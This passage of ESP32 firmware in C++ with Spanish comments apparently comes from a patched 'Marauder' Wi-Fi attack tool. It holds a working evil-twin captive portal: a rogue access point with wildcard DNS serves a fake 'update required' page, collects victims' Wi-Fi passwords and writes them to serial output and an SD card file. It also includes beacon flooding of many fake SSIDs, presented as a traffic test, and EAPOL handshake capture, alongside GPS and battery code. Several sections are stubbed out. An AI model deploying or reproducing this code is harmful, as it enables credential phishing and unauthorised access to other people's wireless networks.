    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    dnsServer = new DNSServer();
    dnsServer->start(53, "*", WiFi.softAPIP());
    
    server = new AsyncWebServer(80);
    
    server->onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/login");
    });
    
    server->on("/login", HTTP_GET, [](AsyncWebServerRequest *request){
        // FIX: String HTML completo y correctamente cerrado
        String html = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
                     "<title>Actualización</title>"
                     "<style>body{font-family:sans-serif;background:#f2f2f2;text-align:center;padding-top:50px;}"
                     "input[type=password]{padding:10px;margin:10px;width:80%;}"
                     "button{padding:10px 20px;background:#007AFF;color:white;border:none;border-radius:5px;}</style>"
                     "</head><body><h2>Actualización Requerida</h2>"
                     "<p>Ingrese su contraseña Wi-Fi para continuar.</p>"
                     "<form action='/submit' method='POST'>"
                     "<input type='password' name='pwd' placeholder='Contraseña'><br>"
                     "<button type='submit'>Continuar</button></form></body></html>";
        request->send(200, "text/html", html);
    });
    
    server->on("/submit", HTTP_POST, [this](AsyncWebServerRequest *request){
        if(request->hasParam("pwd", true)){
            String pwd = request->getParam("pwd", true)->value();
            Serial.printf("[EVIL TWIN] Credencial: %s\n", pwd.c_str());
            
            if(sdCardMounted && xSemaphoreTake(sdMutex, pdMS_TO_TICKS(100)) == pdTRUE){
                File f = SD.open("/credentials.txt", FILE_APPEND);
                if(f){
                    f.printf("SSID: %s | PWD: %s\n", WiFi.softAPSSID().c_str(), pwd.c_str());
                    f.close();
                }
                xSemaphoreGive(sdMutex);
            }
        }
        request->send(200, "text/html", "<html><body><h2>Cargando...</h2><p>Procesando, por favor espere.</p></body></html>");
    });
    
    server->begin();
}

// ─── TRAFFIC GENERATION con watchdog reset ───
void MarauderS3::startTrafficGeneration(const TrafficGenConfig& cfg) {
    Serial.printf("[TrafficGen] 🚀 Iniciando test: %d SSIDs, canal %d, %lus\n", 
                  cfg.ssid_count, cfg.channel, cfg.duration_sec);
    
    WiFi.mode(WIFI_MODE_AP);
    
    uint8_t* beacon_frame = nullptr;
    uint16_t beacon_len = 0;
    
    uint32_t start_time = millis();
    uint32_t frame_count = 0;
    
    while (millis() - start_time < cfg.duration_sec * 1000) {
        // FIX: Reset watchdog en bucle largo para evitar reboot
        esp_task_wdt_reset();
        
        if (cfg.channel == 0) {
            uint8_t next_chan = (frame_count % 11) + 1;
            esp_wifi_set_channel(next_chan, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        
        for (uint8_t i = 0; i < cfg.ssid_count && i < 50; i++) {
            char test_ssid[64];
            snprintf(test_ssid, sizeof(test_ssid), "%s%02d", cfg.ssid_prefix, i);
            
            beacon_frame = buildBeaconFrame(test_ssid, cfg.beacon_interval, &beacon_len);
            if (!beacon_frame) continue;
            
            esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, beacon_len, false);
            frame_count++;
            
            free(beacon_frame); // FIX: Caller responsable de free()
            vTaskDelay(pdMS_TO_TICKS(2));
        }
        
        AppEvent evt{EVT_STATUS, (int)frame_count, ""};
        snprintf(evt.msg, sizeof(evt.msg), "Frames: %lu | Tiempo: %lus", 
                 frame_count, (millis() - start_time) / 1000);
        xQueueSend(eventQueue, &evt, 0);
        
        vTaskDelay(pdMS_TO_TICKS(cfg.beacon_interval / 10));
    }
    
    Serial.printf("[TrafficGen] ✅ Test completado: %lu frames transmitidos\n", frame_count);
    
    if (sdCardMounted && xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        saveTrafficTestResults(cfg, frame_count, millis() - start_time);
        xSemaphoreGive(spiMutex);
    }
}

// ─── EAPOL CALLBACK con null check y boundary ───
void MarauderS3::eapolCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    // FIX: Null check antes de acceder a marauder global
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !pkt->payload) return;
    
    // FIX: Boundary check ANTES de acceder a payload[]
    if (pkt->rx_ctrl.sig_len < 14) return;
    
    uint8_t* frame = pkt->payload;
    
    if (frame[12] != 0x88 || frame[13] != 0x8E) return;
    uint8_t eapol_type = frame[15];
    if (eapol_type != 0x03) return;
    
    // ... resto del procesamiento ...
    
    // FIX: Null check antes de llamar a método de instancia global
    if (&marauder) {
        marauder.saveEAPOLFrame(frame, pkt->rx_ctrl.sig_len, 0);
    }
}

// ─── HARDWARE TASK con mutex en gpsData write ───
void hardwareTask(void* arg) {
    esp_task_wdt_add(NULL);
    uint32_t lastBat = 0;
    uint32_t lastWiFiScan = 0;
    uint32_t lastCC1101Scan = 0;

    for (;;) {
        esp_task_wdt_reset();

        // ── GPS ──
        while (marauder.gpsSerial.available()) {
            if (marauder.gps.encode(marauder.gpsSerial.read())) {
                if (marauder.gpsMutex && xSemaphoreTake(marauder.gpsMutex, pdMS_TO_TICKS(25)) == pdTRUE) {
                    marauder.gpsData.valid = marauder.gps.location.isValid();
                    if (marauder.gpsData.valid) {
                        marauder.gpsData.lat = marauder.gps.location.lat();
                        marauder.gpsData.lng = marauder.gps.location.lng();
                        marauder.gpsData.alt = marauder.gps.altitude.meters();
                        marauder.gpsData.speed = marauder.gps.speed.kmph();
                        if (marauder.gps.course.isValid()) {
                            marauder.gpsData.heading = marauder.gps.course.deg();
                        }
                        marauder.gpsFixed = true;
                    } else {
                        marauder.gpsFixed = false;
                    }
                    marauder.gpsData.sats = marauder.gps.satellites.value();
                    xSemaphoreGive(marauder.gpsMutex);

                    AppEvent evt{EVT_GPS, 0, ""};
                    if (marauder.eventQueue) {
                        xQueueSend(marauder.eventQueue, &evt, 0);
                    }
                }
            }
        }

        // ── BATERÍA con EMA smoothing ──
        if (millis() - lastBat > 2000) {
            // FIX: Lectura única + EMA para evitar bloqueo y suavizar ruido
            int raw = analogRead(BAT_ADC_PIN);
            float voltage_raw = (raw / 4095.0f) * 3.3f;
            float voltage = voltage_raw * BAT_DIVIDER_RATIO;
            
            // Exponential Moving Average (alpha = 0.1 para suavizado)
            if (!marauder.batEmaInitialized) {
                marauder.batEma = voltage;
                marauder.batEmaInitialized = true;
            } else {
                marauder.batEma = 0.9f * marauder.batEma + 0.1f * voltage;
            }
            marauder.batVoltage = marauder.batEma;
            
            // Rango LiPo 1S: 3.2V = 0% | 4.2V = 100%
            float v_min = 3.2f;
            float v_max = 4.2f;
            marauder.batPercent = constrain(
                (int)(((marauder.batVoltage - v_min) / (v_max - v_min)) * 100), 0, 100
            );

            AppEvent evt{EVT_BAT, marauder.batPercent, ""};
            if (marauder.eventQueue) {
                xQueueSend(marauder.eventQueue, &evt, 0);
            }
            lastBat = millis();
        }

        // ... resto de hardwareTask se mantiene igual ...

        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

// ─── HELPER FUNCTIONS con documentación de ownership ───
// FIX: Documentar claramente que el caller debe free() el retorno
uint8_t* MarauderS3::build80211ManagementFrame(const TestFrameConfig& cfg, uint16_t* out_len) {
    uint16_t frame_size = 24 + cfg.ie_len + 4;
    // Intentar PSRAM primero, fallback a SRAM
    uint8_t* frame = (uint8_t*)heap_caps_malloc(frame_size, MALLOC_CAP_SPIRAM);
    if (!frame) frame = (uint8_t*)malloc(frame_size);
    if (!frame) return nullptr;
    
    // ... construcción del frame ...
    
    *out_len = /* cálculo */;
    // ⚠️  El caller DEBE llamar free(frame) después de usar el retorno
    return frame;
}

// Mismas consideraciones para buildSSID_IE y buildRates_IE
uint8_t* buildSSID_IE(const char* ssid, uint8_t* out_len) {
    uint8_t ssid_len = strlen(ssid);
    uint8_t* ie = (uint8_t*)malloc(2 + ssid_len);
    if (!ie) return nullptr;
    ie[0] = 0x00;
    ie[1] = ssid_len;
    memcpy(ie + 2, ssid, ssid_len);
    *out_len = 2 + ssid_len;
    // ⚠️  Caller responsable de free(ie)
    return ie;
}

uint8_t* buildRates_IE(const uint8_t* rates, uint8_t rate_count, uint8_t* out_len) {
    *out_len = 2 + rate_count;
    uint8_t* ie = (uint8_t*)malloc(*out_len);
    if (!ie) return nullptr;
    ie[0] = 0x01;
    ie[1] = rate_count;
    memcpy(ie + 2, rates, rate_count);
    // ⚠️  Caller responsable de free(ie)
    return ie;
}

// ======================== SETUP PRINCIPAL ========================
void setup() {
    Serial.begin(115200);
    delay(800);
    Serial.println("\n\n=== MARAUDER ESP32-S3 FULL POWER v2.1 [CORREGIDO] ===");

    // Watchdog
    esp_task_wdt_init(10, true);

    // ... resto de setup se mantiene igual ...
    
    Serial.println("¡Sistema corregido y listo! 🔧✅\n");
}

void loop() {
    vTaskDelay(portMAX_DELAY);
}
